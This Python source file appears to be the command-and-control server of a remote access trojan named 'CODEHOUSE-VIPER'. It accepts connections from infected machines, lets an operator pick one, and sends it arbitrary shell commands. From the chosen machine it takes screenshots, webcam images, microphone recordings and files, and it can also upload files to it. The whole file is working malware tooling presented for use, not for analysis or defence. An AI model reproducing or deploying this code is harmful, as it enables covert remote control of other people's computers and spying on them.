import socket
# from helpMenu import helpOptions
from threading import Thread
import time
from datetime import datetime
import os
import secrets
from tqdm import tqdm
import math

# lists to store things
all_connections = []
all_address = []

# Setting the host and ports.
host = "localhost"
port = 5000


def creat_socket_and_listen():
    global host
    global port
    global s
    # Initializing the socke
    try:

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((host, port))
        s.listen(10)
        print(' ')

    except Exception as error:
        print("[-] The server failed to start due to this error: " + str(error))


def accept_incoming_connections_n_store_it():
    # First we need to close all the connections and then clear the lists.
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    # Now that the lists are clear we accept new connections and store them in the empty lists.
    while True:
        try:
            conn, addrs = s.accept()
            # this will allow us to maintain the connection with the server
            s.setblocking(1)
            all_connections.append(conn)
            all_address.append(addrs)
            # Note that the addrs is a tuple of the host(IP) and port
            print(" ")
            print(f"[+] Got a connection from {addrs[0]} : ")

        except Exception as error:
            print(f"[-] Failure to get connected due to error > > {error}")


def list_connections():
    results = " "

    # check the meaning of enumerate
    for i, conn in enumerate(all_connections):
        # we are using the try cuz we want to check if the person is connected or not
        # if not we will delete that user form our lists
        try:
            conn.send(str.encode(" "))
            conn.recv(201480)
        except:
            del all_address[i]
            del all_connections[i]
            # continue cuz we do not want to store him in our  results which we are
            # to print,since we want only valid connections
            continue
        # here we are just printing out the addresses and the ports of all our clients
        results = str(i) + "  " + \
            str(all_address[i][0]) + str(all_address[i][1]) + '\n'

    print('==========clients==========')
    print(results)


def selection_mechanism(cmd):
    try:
        conn_ID = cmd.replace("select", "")
        target = int(conn_ID)
        # Note that the index of the all_connections list
        # correspondes to the index of the all_address list.
        # So you can use the same index to acess the IP and ports of the connection.
        selected_conn = all_connections[target]
        selected_conn_IP = all_address[target][0]
        selected_conn_port = all_address[target][1]

        print(f'''
                You are connected to:                
                IP >> {selected_conn_IP}
                On Port >> {selected_conn_port}
        ''')
        return selected_conn

    except:
        print("The connection does not exit, invalid selection")
        return None


def shell():
    for x in tqdm(range(5), desc='lOaDiNg', leave=True, unit='Seconds'):
        time.sleep(2)
    try:
        os.system('cls')
    except:
        pass
    while True:
        cmd = input("\u001b[31m CODEHOUSE-VIPER >>> \u001b[37m ")

        if cmd == "ls":
            list_connections()

        elif "select" in cmd:
            conn = selection_mechanism(cmd)

            if conn is not None:
                send_commands_center(conn)

        elif cmd == "freezo":
            helpOptions()

        else:
            print("[-] An recognized command. Type freezo for help")

################functions that are called in the send_command_center below######################


colors = {
    'black': '\u001b[30m',
    'red': '\u001b[31m',
    'green': '\u001b[32m',
    'yellow': '\u001b[33m',
    'blue': '\u001b[34m',
    'magenta': '\u001b[35m',
    'cyan': '\u001b[36m',
    'white': '\u001b[37m'
}


def colorSelector(word, color):
    color = str(color)
    word = str(word)
    return str(colors[color]+word + colors['white'])



def downloadMechanism(conn, fileName, fileMode, filesize):
    # open file
    f = open(str(fileName), str(fileMode))

    # calculate number of times to recieve.
    notimes = int(filesize)/1024
    deci, whole = math.modf(notimes)
    lists = []
    if deci > 0:
        for x in range(int(whole)+1):
            lists.append(1)
    else:
        for x in range(int(whole)):
            lists.append(1)
    # create the progress bar while downloading the file
    loop = tqdm(total=len(lists), position=0, leave=True, unit='KB',
                desc=(colorSelector('Downloading', 'blue')))
    conn.send('ready'.encode())
    data = conn.recv(1024)
    while not ('complete' in str(data)):
        f.write(data)
        data = conn.recv(1024)
        loop.update(1)
    f.close()


def uploadMechanism(conn, fileName, fileMode, filesize):
    # datatype conversion
    filename = str(fileName)
    fileMode = str(fileMode)
    filesize = int(filesize)
    # progress bar calculations
    notimes = int(filesize)/1024
    deci, whole = math.modf(notimes)
    lists = []
    if deci > 0:
        for x in range(int(whole)+1):
            lists.append(1)
    else:
        for x in range(int(whole)):
            lists.append(1)
    loop = tqdm(total=len(lists), position=0, leave=True,
                unit="KB", desc=colorSelector('Uploding', 'blue'))
    # opening file and sending byte
    f = open(filename, fileMode)
    data = f.read(1024)
    while (data):
        conn.send(data)
        data = f.read(1024)
        loop.update(1)
    conn.send('complete'.encode())
    f.close()


def uploadfile(conn):
    filetoUpload = input('Enter file name and its extesion>> ')
    try:
        fullfilepath = str(os.path.join(os.getcwd(), 'uploads', filetoUpload))
        filesize = os.path.getsize(fullfilepath)
    except Exception as error:
        print(error)
    if os.path.isfile(fullfilepath):
        user_responds = input(
            f'file exists {filesize} byte(s), do you want to upload the file [y/n] ')
        conn.send(str(filetoUpload).encode())
        if str(user_responds).upper() == 'Y':
            uploadMechanism(conn, fullfilepath, 'rb', filesize)
        else:
            print('[+] File upload successfully aborted.')
    else:
        print('[-] File does not exist in the file system.')


def downloadFile(conn):
    filestate = conn.recv(1024)
    if filestate.decode() == 'exists':
        conn.send('filesize'.encode())
        filesize = conn.recv(1024).decode()
        print('file size in byte: ' + str(filesize))
        requestDownload = input('Do you want to download the file? [y/n] ')
        if str(requestDownload).upper() == 'Y':
            userFileName = input('Save the file as (include extension) : ')
            fullfilepath = str(os.getcwd() + os.sep + userFileName)
            downloadMechanism(conn, fullfilepath, 'wb', filesize)
        else:
            print("[-] Download aborted")
    else:
        filestate = conn.recv(1024).decode()
        print(filestate)


def getsysInfo(conn):
    conn.recv(2000)


def Webcam_screenshot(conn):
    userFileName = input('Save the file as (include extension) : ')
    fullfilepath = str(os.getcwd() + os.sep + userFileName)
    filesize = conn.recv(1024).decode()
    downloadMechanism(conn, fullfilepath, "wb", filesize)


def downloadSound(conn):
    duration = input('Duration (seconds)')

    try:
        if duration != '':
            duration = int(duration)
            conn.send(str(duration).encode())
        elif duration == '':
            duration = 10
            conn.send(str(duration).encode())
    except:
        print('Invalid input for durations')
        conn.send(' '.encode())
        return 0

    userFileName = input('Save the file as (include extension) : ')
    fullfilepath = str(os.getcwd() + os.sep + userFileName)
    print(f'Wait for {duration} seconds while sound is being recorded.')
    filesize = conn.recv(1024).decode()
    downloadMechanism(conn, fullfilepath, "wb", filesize)


############################################ END OF THE FUNCTIONS ##############################


def send_commands_center(conn):
    while True:
        try:

            cmd = input("\u001b[32m >>>\u001b[37m")

            if cmd == "quit":
                break

            elif len(cmd) > 0:
                # encoding the command to send
                encoded = cmd.encode('utf-8')
                conn.send(encoded)
                client_respond = conn.recv(50000)

                ######## THE PLACE TO CALL THE FUNCTIONS AFTER CLIENT RESPONDS #######
                if client_respond.decode() == 'screenshot':
                    t1 = Thread(target=Webcam_screenshot, args=[conn])
                    t1.daemon = True
                    t1.start()
                    t1.join()
                    continue

                elif client_respond.decode() == 'webcam':
                    t2 = Thread(target=Webcam_screenshot, args=[conn])
                    t2.daemon = True
                    t2.start()
                    t2.join()
                    continue

                elif client_respond.decode() == 'sending file':
                    t3 = Thread(target=downloadFile, args=[conn])
                    t3.daemon = True
                    t3.start()
                    t3.join()
                    continue

                elif client_respond.decode() == 'sending sound':
                    t3 = Thread(target=downloadSound, args=[conn])
                    t3.daemon = True
                    t3.start()
                    t3.join()
                    continue

                elif client_respond.decode() == 'upload':
                    t3 = Thread(target=uploadfile, args=[conn])
                    t3.daemon = True
                    t3.start()
                    t3.join()
                    continue
                else:
                    print(" ")
                    print(client_respond.decode())

            # elif cmd ==  "freezo":
            #     helpOptions()
            #     continue

            elif cmd == "sys info":
                getsysInfo(conn)
                continue

            else:
                print("[-] Unrecognized command")

        except Exception as error:
            print(error)


########################### THREADS AND THEIR FUNCTIONS########################################

def clearTerminal():
    try:
        os.system('cls')
    except:
        pass


threads_list = []
work_list = [clearTerminal, shell, creat_socket_and_listen,
             accept_incoming_connections_n_store_it]


for work in work_list:
    t = Thread(target=work)
    t.daemon = True
    t.start()
    time.sleep(2)
    threads_list.append(t)

for t in threads_list:
    t.join()
